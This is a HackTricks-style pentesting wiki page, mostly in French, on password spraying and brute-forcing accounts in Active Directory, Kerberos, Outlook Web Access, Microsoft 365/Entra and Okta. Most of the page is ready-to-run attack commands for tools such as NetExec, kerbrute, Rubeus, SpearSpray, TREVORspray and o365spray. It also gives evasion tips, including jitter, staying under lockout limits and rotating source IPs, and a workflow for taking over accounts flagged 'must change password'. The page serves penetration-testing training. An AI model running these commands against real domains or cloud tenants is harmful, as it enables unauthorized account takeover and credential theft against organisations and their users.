# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Une fois que vous avez trouvé plusieurs **noms d'utilisateur valides**, vous pouvez essayer les **mots de passe les plus courants** (en tenant compte de la politique de mots de passe de l'environnement) avec chacun des utilisateurs identifiés.\
Par **défaut**, la **longueur** **minimale** d'un **mot de passe** est de **7**.

Les listes de noms d'utilisateur courants peuvent également être utiles : [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Notez que vous **pourriez verrouiller certains comptes si vous essayez plusieurs mots de passe incorrects** (par défaut, plus de 10).

### Obtenir la politique de mots de passe

Si vous disposez des identifiants d'un utilisateur ou d'un shell en tant qu'utilisateur de domaine, vous pouvez **obtenir la politique de mots de passe avec** :
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation depuis Linux (ou tous)

- En utilisant **crackmapexec** :
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Utilisation de **NetExec (CME successor)** pour un spraying ciblé et discret via SMB/WinRM :
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Avec [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(vous pouvez indiquer le nombre de tentatives pour éviter les verrouillages) :**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Utilisation de [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NON RECOMMANDÉ, NE FONCTIONNE PARFOIS PAS<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Avec le module `scanner/smb/smb_login` de **Metasploit** :

![Password Spraying - Brute-Force : avec le module scanner/smb/smb login de Metasploit](<../../images/image (745).png>)

- Avec **rpcclient** :<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Depuis Windows

- Avec une version de [Rubeus](https://github.com/Zer1t0/Rubeus) disposant du module brute :
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Avec [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Il peut générer les utilisateurs du domaine par défaut et récupérer la password policy du domaine afin de limiter les tentatives en fonction de celle-ci) :<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Avec [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifier et prendre le contrôle des comptes « Password must change at next logon » (SAMR)

Une technique à faible bruit consiste à tester par spray un mot de passe bénin/vide et à repérer les comptes renvoyant STATUS_PASSWORD_MUST_CHANGE, ce qui indique que le mot de passe a été forcé à expirer et qu’il peut être modifié sans connaître l’ancien.<sup>[[9]](#references)[[10]](#references)</sup>

Workflow :
- Énumérer les utilisateurs (RID brute force via SAMR) afin de constituer la liste des cibles :

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Effectuez un password spraying avec un mot de passe vide et continuez sur les correspondances pour identifier les comptes qui doivent changer leur mot de passe à la prochaine connexion :
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Pour chaque résultat, changez le mot de passe via SAMR avec le module de NetExec (aucien ancien mot de passe n’est nécessaire lorsque « must change » est défini) :
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operational notes :
- Ensurez-vous que l’horloge de votre host est synchronisée avec celle du DC avant les opérations basées sur Kerberos : `sudo ntpdate <dc_fqdn>`.
- Un [+] sans (Pwn3d!) dans certains modules (par ex. RDP/WinRM) signifie que les creds sont valides, mais que le compte ne dispose pas des droits de connexion interactive.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Spraying de pré-authentification Kerberos avec ciblage LDAP et limitation adaptative tenant compte des PSO (SpearSpray)

Le spraying basé sur la pré-authentification Kerberos réduit le bruit par rapport aux tentatives SMB/NTLM/LDAP bind et s’aligne mieux sur les politiques de verrouillage AD. SpearSpray associe un ciblage piloté par LDAP, un moteur de patterns et une prise en compte des politiques (politique de domaine + PSO + marge pour `badPwdCount`) afin d’effectuer un spraying précis et sûr. Il peut également marquer les principaux compromis dans Neo4j pour le pathing BloodHound.<sup>[[1]](#references)</sup>

Idées clés :
- Découverte des utilisateurs LDAP avec pagination et prise en charge de LDAPS, avec possibilité d’utiliser des filtres LDAP personnalisés.
- Filtrage tenant compte de la politique de verrouillage du domaine et des PSO, afin de conserver une marge configurable de tentatives (`threshold`) et d’éviter le verrouillage des utilisateurs.
- Validation de la pré-authentification Kerberos à l’aide de bindings gssapi rapides (génère les événements 4768/4771 sur les DC plutôt que 4625).
- Génération de mots de passe par utilisateur basée sur des patterns, à l’aide de variables telles que les noms et les valeurs temporelles dérivées du `pwdLastSet` de chaque utilisateur.
- Contrôle du débit avec des threads, du jitter et un nombre maximal de requêtes par seconde.
- Intégration facultative avec Neo4j pour marquer les utilisateurs compromis dans BloodHound.

Utilisation de base et découverte :
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Ciblage et contrôle des motifs :
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Contrôles de furtivité et de sécurité :
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Enrichissement de Neo4j/BloodHound :
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Présentation générale du système de patterns (patterns.txt) :
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:

- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

There are multiple tools for p**assword spraying Outlook**.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)<sup>[[5]](#references)</sup>
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Pour utiliser l’un de ces outils, vous avez besoin d’une liste d’utilisateurs et d’un mot de passe / d’une petite liste de mots de passe à tester.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Pour le spraying cloud, identifiez d'abord si le tenant est **managed**, **federated** ou **hybrid**, car l'endpoint et le comportement du lockout peuvent différer d'Active Directory local. Dans Microsoft Entra, **Smart Lockout** modifie la manière dont les tentatives répétées consomment le lockout budget :<sup>[[7]](#references)</sup>

- Répéter le **même mot de passe erroné** n'incrémente pas continuellement le lockout counter, mais essayer de **nouveaux candidats** l'incrémente.
- Les emplacements **familiers** et **non familiers** disposent de compteurs distincts.
- Les tenants utilisant l'**authentification pass-through (PTA)** ne bénéficient pas du suivi des hash de mots de passe erronés ; traitez-les donc davantage comme des cibles classiques sensibles au lockout.

En pratique, effectuez le spray **d'un seul mot de passe par round**, laissez suffisamment d'intervalle entre les rounds et privilégiez les outils capables de découvrir le flux d'authentification réel du tenant avant d'envoyer des tentatives.

- Avec [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), vous pouvez effectuer la reconnaissance du tenant, découvrir le `token_endpoint`, effectuer le spray sur `msol`/`adfs`/`owa`/`okta` et faire transiter le trafic par plusieurs IP de sortie :
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Avec [**Spray365**](https://github.com/MarkoH17/Spray365), vous pouvez pré-construire un **plan d’exécution** reprenable, randomiser l’ordre d’authentification et imposer un **délai minimal par utilisateur** pour rester en dehors de la fenêtre de verrouillage :
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Avec [**o365spray**](https://github.com/0xZDH/o365spray), vous pouvez valider le tenant, énumérer les utilisateurs avec des modules tels que `onedrive`, et effectuer du spray via `oauth2` ou `adfs`, tout en limitant à **une tentative par utilisateur** pendant chaque fenêtre de verrouillage. Si vous disposez déjà d’une API FireProx, transmettez-la avec `--proxy-url` afin de répartir les adresses IP sources :
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Les techniques récentes des opérateurs se sont également orientées vers le **spraying cloud distribué**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) prend en charge les fenêtres temporelles, le mélange des mots de passe, le spraying ADFS/M365 et l’exfiltration post-authentification automatique. Des abus réels récents ont également utilisé l’**API Microsoft Teams** pour l’énumération de comptes et la **rotation des régions AWS** afin de répartir les vagues de spraying entre plusieurs zones géographiques sources.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Références

- [1] [SpearSpray – Améliorer votre password spraying Active Directory grâce aux informations sur les utilisateurs](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Bruteforcing Kerberos avec Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – Un outil de password spraying pour les identifiants Active Directory](https://github.com/Greenwolf/Spray)
- [4] [Password spraying Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password spraying d’Outlook Web Access : shell distant](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password spraying et autres activités amusantes avec RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Verrouillage intelligent Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint : les attaquants lancent TeamFiltration : campagne de prise de contrôle de comptes](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf : du spraying à gMSA, puis à DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — LDAP anonyme → Password spraying → SeBackupPrivilege → Administrateur du domaine](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
